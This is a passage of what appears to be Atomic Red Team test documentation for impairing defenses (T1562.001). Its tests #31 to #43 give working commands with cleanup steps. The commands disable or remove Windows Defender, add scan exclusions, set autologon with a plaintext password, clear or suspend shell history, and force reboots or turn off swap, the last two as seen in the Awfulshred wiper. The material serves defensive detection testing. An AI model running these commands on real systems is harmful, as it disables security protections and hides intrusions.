<h3>Atomic Test #31 - Tamper with Windows Defender ATP using Aliases - PowerShellAttempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled<a class="headerlink" href="#atomic-test-31-tamper-with-windows-defender-atp-using-aliases-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-using-set-mppreference-aliases-upon-execution-virus-and-threat-protection-will-show-as-disabled" title="Permalink to this heading">#</a></h3>
<p>in Windows settings.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-MpPreference</span> <span class="n">-drtm</span> <span class="nv">$True</span>
<span class="nb">Set-MpPreference</span> <span class="n">-dbm</span> <span class="nv">$True</span>
<span class="nb">Set-MpPreference</span> <span class="n">-dscrptsc</span> <span class="nv">$True</span>
<span class="nb">Set-MpPreference</span> <span class="n">-dbaf</span> <span class="nv">$True</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">31</span>
</pre></div>
</div>
</div>
</div>
<section id="id51">
<h4>Cleanup:<a class="headerlink" href="#id51" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-MpPreference</span> <span class="n">-drtm</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-dbm</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-dscrptsc</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-dbaf</span> <span class="n">0</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">31</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-32-lockbit-black-disable-privacy-settings-experience-using-registry-cmdlockbit-black-disable-privacy-settings-experience-using-registry">
<h3>Atomic Test #32 - LockBit Black - Disable Privacy Settings Experience Using Registry -cmdLockBit Black - Disable Privacy Settings Experience Using Registry<a class="headerlink" href="#atomic-test-32-lockbit-black-disable-privacy-settings-experience-using-registry-cmdlockbit-black-disable-privacy-settings-experience-using-registry" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add &quot;HKCU\Software\Policies\Microsoft\Windows\OOBE&quot; /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">32</span>
</pre></div>
</div>
</div>
</div>
<section id="id52">
<h4>Cleanup:<a class="headerlink" href="#id52" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>reg delete &quot;HKCU\Software\Policies\Microsoft\Windows\OOBE&quot; /v DisablePrivacyExperience /f &gt;nul 2&gt;&amp;1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">32</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-33-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-cmdlockbit-black-use-registry-editor-to-turn-on-automatic-logon">
<h3>Atomic Test #33 - LockBit Black - Use Registry Editor to turn on automatic logon -cmdLockBit Black - Use Registry Editor to turn on automatic logon<a class="headerlink" href="#atomic-test-33-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-cmdlockbit-black-use-registry-editor-to-turn-on-automatic-logon" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v AutoAdminLogon /t REG_DWORD /d 1 /f
reg add &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultUserName /t REG_SZ /d Administrator /f
reg add &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultDomainName /t REG_SZ /d contoso.com /f
reg add &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword /t REG_SZ /d password1 /f
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">33</span>
</pre></div>
</div>
</div>
</div>
<section id="id53">
<h4>Cleanup:<a class="headerlink" href="#id53" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>reg delete &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v AutoAdminLogon /f &gt;nul 2&gt;&amp;1
reg delete &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultUserName /f &gt;nul 2&gt;&amp;1
reg delete &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultDomainName /f &gt;nul 2&gt;&amp;1
reg delete &quot;HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword /f &gt;nul 2&gt;&amp;1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">33</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-34-lockbit-black-disable-privacy-settings-experience-using-registry-powershelllockbit-black-disable-privacy-settings-experience-using-registry">
<h3>Atomic Test #34 - LockBit Black - Disable Privacy Settings Experience Using Registry -PowershellLockBit Black - Disable Privacy Settings Experience Using Registry<a class="headerlink" href="#atomic-test-34-lockbit-black-disable-privacy-settings-experience-using-registry-powershelllockbit-black-disable-privacy-settings-experience-using-registry" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKCU:\Software\Policies\Microsoft\Windows\OOBE&quot;</span> <span class="n">-Name</span> <span class="n">DisablePrivacyExperience</span> <span class="n">-PropertyType</span> <span class="n">DWord</span> <span class="n">-Value</span> <span class="n">1</span> <span class="n">-Force</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">34</span>
</pre></div>
</div>
</div>
</div>
<section id="id54">
<h4>Cleanup:<a class="headerlink" href="#id54" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-ItemProperty</span> <span class="s2">&quot;HKCU:\Software\Policies\Microsoft\Windows\OOBE&quot;</span> <span class="n">-Name</span> <span class="n">DisablePrivacyExperience</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">34</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-35-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-powershelllockbit-black-use-registry-editor-to-turn-on-automatic-logon">
<h3>Atomic Test #35 - Lockbit Black - Use Registry Editor to turn on automatic logon -PowershellLockbit Black - Use Registry Editor to turn on automatic logon<a class="headerlink" href="#atomic-test-35-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-powershelllockbit-black-use-registry-editor-to-turn-on-automatic-logon" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">AutoAdminLogon</span> <span class="n">-PropertyType</span> <span class="n">DWord</span> <span class="n">-Value</span> <span class="n">1</span> <span class="n">-Force</span>
<span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultUserName</span> <span class="n">-Value</span> <span class="n">Administrator</span> <span class="n">-Force</span>
<span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultDomainName</span> <span class="n">-Value</span> <span class="n">contoso</span><span class="p">.</span><span class="n">com</span> <span class="n">-Force</span>
<span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultPassword</span>  <span class="n">-Value</span> <span class="n">password1</span> <span class="n">-Force</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">35</span>
</pre></div>
</div>
</div>
</div>
<section id="id55">
<h4>Cleanup:<a class="headerlink" href="#id55" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">AutoAdminLogon</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
<span class="nb">Remove-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultUserName</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
<span class="nb">Remove-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultDomainName</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
<span class="nb">Remove-ItemProperty</span> <span class="s2">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultPassword</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">35</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-36-disable-windows-defender-with-pwsh-disable-windowsoptionalfeaturethe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-powershell-cmdlet-disable-windowsoptionalfeature-deployment-image-servicing-and-management-tool">
<h3>Atomic Test #36 - Disable Windows Defender with PwSh Disable-WindowsOptionalFeatureThe following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool.<a class="headerlink" href="#atomic-test-36-disable-windows-defender-with-pwsh-disable-windowsoptionalfeaturethe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-powershell-cmdlet-disable-windowsoptionalfeature-deployment-image-servicing-and-management-tool" title="Permalink to this heading">#</a></h3>
<p>Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
This method will remove Defender and it’s packages.
Reference: <a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps">https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps</a>
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Disable-WindowsOptionalFeature</span> <span class="n">-Online</span> <span class="n">-FeatureName</span> <span class="s2">&quot;Windows-Defender-Gui&quot;</span> <span class="n">-NoRestart</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
<span class="nb">Disable-WindowsOptionalFeature</span> <span class="n">-Online</span> <span class="n">-FeatureName</span> <span class="s2">&quot;Windows-Defender-Features&quot;</span> <span class="n">-NoRestart</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
<span class="nb">Disable-WindowsOptionalFeature</span> <span class="n">-Online</span> <span class="n">-FeatureName</span> <span class="s2">&quot;Windows-Defender&quot;</span> <span class="n">-NoRestart</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
<span class="nb">Disable-WindowsOptionalFeature</span> <span class="n">-Online</span> <span class="n">-FeatureName</span> <span class="s2">&quot;Windows-Defender-ApplicationGuard&quot;</span> <span class="n">-NoRestart</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span><span class="p">```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">36</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-37-wmic-tamper-with-windows-defender-evade-scanning-folderthe-following-atomic-will-attempt-to-exclude-a-folder-within-defender-leveraging-wmi">
<h3>Atomic Test #37 - WMIC Tamper with Windows Defender Evade Scanning FolderThe following Atomic will attempt to exclude a folder within Defender leveraging WMI<a class="headerlink" href="#atomic-test-37-wmic-tamper-with-windows-defender-evade-scanning-folderthe-following-atomic-will-attempt-to-exclude-a-folder-within-defender-leveraging-wmi" title="Permalink to this heading">#</a></h3>
<p>Reference: <a class="reference external" href="https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/">https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/</a>
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\&quot;ATOMICREDTEAM\&quot;
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">37</span>
</pre></div>
</div>
</div>
</div>
<section id="id56">
<h4>Cleanup:<a class="headerlink" href="#id56" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Remove ExclusionPath=\&quot;ATOMICREDTEAM\&quot;
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">37</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-38-delete-windows-defender-scheduled-tasks">
<h3>Atomic Test #38 - Delete Windows Defender Scheduled Tasks<a class="headerlink" href="#atomic-test-38-delete-windows-defender-scheduled-tasks" title="Permalink to this heading">#</a></h3>
<p>The following atomic test will delete the Windows Defender scheduled tasks.</p>
<p><a class="reference external" href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/">Reference</a></p>
<p><strong>Supported Platforms:</strong> windows</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="dependencies-run-with-command-prompt">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code>!<a class="headerlink" href="#dependencies-run-with-command-prompt" title="Permalink to this heading">#</a></h4>
<section id="description-the-windows-defender-scheduled-tasks-must-be-backed-up-first">
<h5>Description: The Windows Defender scheduled tasks must be backed up first<a class="headerlink" href="#description-the-windows-defender-scheduled-tasks-must-be-backed-up-first" title="Permalink to this heading">#</a></h5>
</section>
<section id="id57">
<h5>Check Prereq Commands:<a class="headerlink" href="#id57" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>IF EXIST &quot;%temp%\Windows_Defender_Scheduled_Scan.xml&quot; ( EXIT 0 ) ELSE ( EXIT 1 )

</pre></div>
</div>
</section>
<section id="id58">
<h5>Get Prereq Commands:<a class="headerlink" href="#id58" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>schtasks /query /xml /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan&quot; &gt; &quot;%temp%\Windows_Defender_Scheduled_Scan.xml&quot;
schtasks /query /xml /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Cleanup&quot; &gt; &quot;%temp%\Windows_Defender_Cleanup.xml&quot;
schtasks /query /xml /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Verification&quot; &gt; &quot;%temp%\Windows_Defender_Verification.xml&quot;
schtasks /query /xml /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance&quot; &gt; &quot;%temp%\Windows_Defender_Cache_Maintenance.xml&quot;

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">38</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="id59">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id59" title="Permalink to this heading">#</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>IF EXIST &quot;%temp%\Windows_Defender_Scheduled_Scan.xml&quot; ( schtasks /delete /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan&quot; /f )
IF EXIST &quot;%temp%\Windows_Defender_Cleanup.xml&quot; ( schtasks /delete /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Cleanup&quot; /f )
IF EXIST &quot;%temp%\Windows_Defender_Verification.xml&quot; ( schtasks /delete /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Verification&quot; /f )
IF EXIST &quot;%temp%\Windows_Defender_Cache_Maintenance.xml&quot; ( schtasks /delete /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance&quot; /f )
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">38</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id60">
<h4>Cleanup:<a class="headerlink" href="#id60" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>schtasks /create /xml &quot;%temp%\Windows_Defender_Scheduled_Scan.xml&quot; /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan&quot; /f
schtasks /create /xml &quot;%temp%\Windows_Defender_Cleanup.xml&quot; /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Cleanup&quot; /f
schtasks /create /xml &quot;%temp%\Windows_Defender_Verification.xml&quot; /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Verification&quot; /f
schtasks /create /xml &quot;%temp%\Windows_Defender_Cache_Maintenance.xml&quot; /tn &quot;\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance&quot; /f
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">38</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-39-clear-historyclear-shell-history-this-technique-only-affect-the-bash-shell-application">
<h3>Atomic Test #39 - Clear HistoryClear Shell History. This technique only affect the bash shell application.<a class="headerlink" href="#atomic-test-39-clear-historyclear-shell-history-this-technique-only-affect-the-bash-shell-application" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">history</span><span class="w"> </span>-c
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">39</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-40-suspend-historysuspend-shell-history-seen-in-awfulshred-wiper-https-unix-stackexchange-com-questions-10922-temporarily-suspend-bash-history-on-a-given-shell">
<h3>Atomic Test #40 - Suspend Historysuspend Shell History seen in Awfulshred wiper- <a class="reference external" href="https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell">https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell</a><a class="headerlink" href="#atomic-test-40-suspend-historysuspend-shell-history-seen-in-awfulshred-wiper-https-unix-stackexchange-com-questions-10922-temporarily-suspend-bash-history-on-a-given-shell" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span><span class="w"> </span>+o<span class="w"> </span><span class="nb">history</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">40</span>
</pre></div>
</div>
</div>
</div>
<section id="id61">
<h4>Cleanup:<a class="headerlink" href="#id61" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">set</span><span class="w"> </span>-o<span class="w"> </span><span class="nb">history</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">40</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-41-reboot-linux-host-via-kernel-system-requestreboot-system-via-system-request-seen-in-awfulshred-wiper">
<h3>Atomic Test #41 - Reboot Linux Host via Kernel System Requestreboot system via system request seen in Awfulshred wiper.<a class="headerlink" href="#atomic-test-41-reboot-linux-host-via-kernel-system-requestreboot-system-via-system-request-seen-in-awfulshred-wiper" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="m">1</span>&gt;<span class="w"> </span>/proc/sys/kernel/sysrq<span class="w"> </span>
<span class="nb">echo</span><span class="w"> </span>b&gt;<span class="w"> </span>/proc/sysrq-trigger<span class="w"> </span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">41</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-42-clear-pagging-cacheclear-pagging-cache-via-system-request-this-is-a-temporary-change-in-the-system-to-clear-paging-cache-this-technique-seen-in-awfulshred-wiper-as-part">
<h3>Atomic Test #42 - Clear Pagging Cacheclear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part<a class="headerlink" href="#atomic-test-42-clear-pagging-cacheclear-pagging-cache-via-system-request-this-is-a-temporary-change-in-the-system-to-clear-paging-cache-this-technique-seen-in-awfulshred-wiper-as-part" title="Permalink to this heading">#</a></h3>
<p>of its malicious payload on the compromised host. added reference link for this technique: <a class="reference external" href="https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/">https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/</a>
<strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>free<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">3</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/vm/drop_caches<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>free
<span class="nb">echo</span><span class="w"> </span><span class="m">3</span>&gt;<span class="w"> </span>/proc/sys/vm/drop_caches<span class="w"> </span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">42</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-43-disable-memory-swapdisable-swapping-of-device-paging-that-impaire-the-compromised-host-to-swap-data-if-the-ram-is-full-awfulshred-wiper-used-this-technique-as-an-additional">
<h3>Atomic Test #43 - Disable Memory Swapdisable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional<a class="headerlink" href="#atomic-test-43-disable-memory-swapdisable-swapping-of-device-paging-that-impaire-the-compromised-host-to-swap-data-if-the-ram-is-full-awfulshred-wiper-used-this-technique-as-an-additional" title="Permalink to this heading">#</a></h3>
<p>payload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.
<strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>swapon<span class="w"> </span>-a<span class="w"> </span>
sleep<span class="w"> </span><span class="m">2</span>
swapoff<span class="w"> </span>-a
sync
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
